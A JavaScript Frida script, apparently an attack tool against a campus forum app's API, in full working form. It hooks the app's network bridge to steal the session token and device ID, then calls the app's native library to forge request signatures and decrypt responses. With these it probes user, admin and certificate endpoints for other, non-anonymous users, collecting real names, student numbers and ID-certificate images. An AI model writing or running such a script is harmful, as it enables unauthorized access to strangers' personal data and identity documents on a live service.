// probe4.js — 正确路径（无 /sc-api 前缀）+ UTF-8 编码，跑完整 PII 探测
var TOKEN = null, ALIAS = null, DEVICE = null, DONE = false;

function sign(fields) {
    var T = Java.use('java.util.TreeMap');
    var I = Java.use('java.lang.Integer');
    var m = T.$new();
    for (var k in fields) {
        var v = fields[k];
        m.put(String(k), (typeof v === 'number') ? I.valueOf(Math.round(v)) : String(v));
    }
    return Java.use('com.comingx.zanao.utils.JniUtils').makeSign(m);
}

function bytesOf(str) {
    var S = Java.use('java.lang.String');
    var bs = S.$new(str).getBytes('UTF-8');
    var arr = [];
    for (var i = 0; i < bs.length; i++) arr.push(bs[i]);
    return Java.array('byte', arr);
}

function api(method, path, data) {
    var S = Java.use('java.lang.String');
    var HUC = Java.use('java.net.HttpURLConnection');
    var url = 'http://api.app.zanao.com' + path;
    var q = [];
    for (var k in data) q.push(encodeURIComponent(k) + '=' + encodeURIComponent(data[k]));
    if (method === 'GET' && q.length) url += '?' + q.join('&');
    var c = Java.cast(Java.use('java.net.URL').$new(url).openConnection(), HUC);
    c.setRequestMethod(method);
    c.setConnectTimeout(15000); c.setReadTimeout(25000); c.setDoInput(true);
    var nd = '', td = String(Math.floor(Date.now() / 1000));
    for (var i = 0; i < 20; i++) nd += Math.floor(Math.random() * 10);
    var si = { timestamp__: td, randnum__: nd };
    for (var kk in data) si[kk] = data[kk];
    var ah = sign(si);
    var h = {
        'X-Sc-Alias': ALIAS, 'X-Sc-Token': TOKEN, 'X-Sc-Client': 'app',
        'X-Sc-Device': DEVICE, 'X-Sc-Platform': 'Android', 'X-Sc-Hb-V': '210',
        'X-Sc-Nt-V': '310', 'X-Sc-Version': '3.1.0', 'X-Sc-Nd': nd, 'X-Sc-Td': td,
        'X-Sc-Ah': ah, 'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'okhttp/4.9.3'
    };
    if (method === 'POST') {
        h['Content-Type'] = 'application/json; charset=utf-8';
        c.setDoOutput(true);
    }
    for (var k2 in h) c.setRequestProperty(k2, String(h[k2]));
    if (method === 'POST') {
        var os = c.getOutputStream();
        os.write(bytesOf(JSON.stringify(data)));
        os.flush(); os.close();
    }
    var code = c.getResponseCode();
    var is = (code >= 400) ? c.getErrorStream() : c.getInputStream();
    var txt = '';
    if (is !== null) {
        var BAOS = Java.use('java.io.ByteArrayOutputStream');
        var buf = Java.array('byte', new Array(8192).fill(0));
        var b = BAOS.$new();
        while (true) { var n = is.read(buf); if (n <= 0) break; b.write(buf, 0, n); }
        is.close(); txt = String(S.$new(b.toByteArray(), 'UTF-8'));
    }
    var j = null; try { j = JSON.parse(txt); } catch (e) { }
    if (j && j.__encrypt__ && j.__data__) {
        try { j = JSON.parse(String(Java.use('com.comingx.zanao.utils.JniUtils').unhashAppResult(j.__data__))); } catch (e) { }
    }
    return { code: code, json: j, raw: j ? null : txt.substring(0, 400) };
}

function collect(o, out, depth) {
    out = out || {}; depth = depth || 0;
    if (depth > 6 || !o) return out;
    if (Array.isArray(o)) { for (var i = 0; i < Math.min(o.length, 2); i++) collect(o[i], out, depth + 1); }
    else if (typeof o === 'object') {
        var K = ['uid', 'user_id', 'nickname', 'headimgurl', 'realname', 'student_no',
                 'cert_img', 'cert_img_url', 'cert_valid', 'errno', 'errmsg', 'reg_days'];
        for (var k in o) {
            if (K.indexOf(k) >= 0 && typeof o[k] !== 'object') out[k] = o[k];
            collect(o[k], out, depth + 1);
        }
    }
    return out;
}

function run() {
    var out = [];
    function push(tag, r, extra) {
        var o = { tag: tag, code: r.code, errno: r.json && r.json.errno, errmsg: r.json && r.json.errmsg };
        if (extra) for (var k in extra) o[k] = extra[k];
        o.fields = collect(r.json);
        o.raw = r.raw;
        out.push(o);
    }
    try { push('POST /thread/v2/list', api('POST', '/thread/v2/list', { page: 1, per_page: 10 })); } catch (e) { out.push({ tag: 'list', err: '' + e }); }

    // 从列表里挑一个别人
    var uid = null, tid = null, peers = [];
    try {
        var r = api('POST', '/thread/v2/list', { page: 1, per_page: 10 });
        var list = null;
        (function f(o) {
            if (!o || typeof o !== 'object' || list) return;
            if (Array.isArray(o) && o.length && o[0] && (o[0].uid || o[0].nickname)) { list = o; return; }
            for (var k in o) f(o[k]);
        })(r.json);
        if (list) {
            for (var i = 0; i < list.length && peers.length < 5; i++) {
                var it = list[i];
                if (it.uid && !it.is_anon) peers.push({ uid: it.uid, nickname: it.nickname, headimgurl: String(it.headimgurl).substring(0, 80) });
            }
            if (peers.length) { uid = peers[0].uid; tid = list[0].thread_id || list[0].id; }
        }
        out.push({ tag: 'peers', list: peers });
    } catch (e) { out.push({ tag: 'peers-err', err: '' + e }); }

    if (uid) {
        try { push('POST /mx/user/usershow', api('POST', '/mx/user/usershow', { uid: uid }), { uid: uid }); } catch (e) { out.push({ tag: 'mxshow', err: '' + e }); }
        try { push('POST /mx/admin/userinfo', api('POST', '/mx/admin/userinfo', { uid: uid }), { uid: uid }); } catch (e) { out.push({ tag: 'mxadmin', err: '' + e }); }
        try { push('POST /thread/admin/userinfo', api('POST', '/thread/admin/userinfo', { uid: uid }), { uid: uid }); } catch (e) { out.push({ tag: 'tadmin', err: '' + e }); }
        try { push('GET /user/certinfo?uid=', api('GET', '/user/certinfo', { school_id: '1', uid: uid }), { uid: uid }); } catch (e) { out.push({ tag: 'certidor', err: '' + e }); }
        if (tid) { try { push('POST /user/usershow', api('POST', '/user/usershow', { thread_id: tid }), { thread_id: tid }); } catch (e) { out.push({ tag: 'show', err: '' + e }); } }
    }
    try { push('POST /user/info', api('POST', '/user/info', { from: 'mine' })); } catch (e) { }
    send({ t: 'results', list: out });
}

(function waitJava(t) {
    if (typeof Java !== 'undefined') {
        Java.perform(function () {
            var N = Java.use('com.comingx.zanao.JSIs.NetworkJSI');
            ['request', 'easyRequest'].forEach(function (m) {
                if (!N[m]) return;
                N[m].overloads.forEach(function (ov) {
                    if (ov.argumentTypes.length !== 1 || ov.argumentTypes[0].className !== 'java.lang.String') return;
                    ov.implementation = function (s) {
                        try {
                            if (!TOKEN && s && s.indexOf('X-Sc-Token') >= 0) {
                                var p = JSON.parse(s);
                                var v = p.parameters[0].value;
                                TOKEN = v.header['X-Sc-Token']; ALIAS = v.header['X-Sc-Alias']; DEVICE = v.header['X-Sc-Device'];
                                send({ t: 'token', alias: ALIAS });
                                setTimeout(function () { try { run(); } catch (e) { send({ t: 'run-err', m: '' + e }); } }, 2000);
                            }
                        } catch (e) { }
                        return ov.call(this, s);
                    };
                });
            });
        });
        return;
    }
    if (t <= 0) { send({ t: 'nojava' }); return; }
    setTimeout(function () { waitJava(t - 1); }, 200);
})(200);
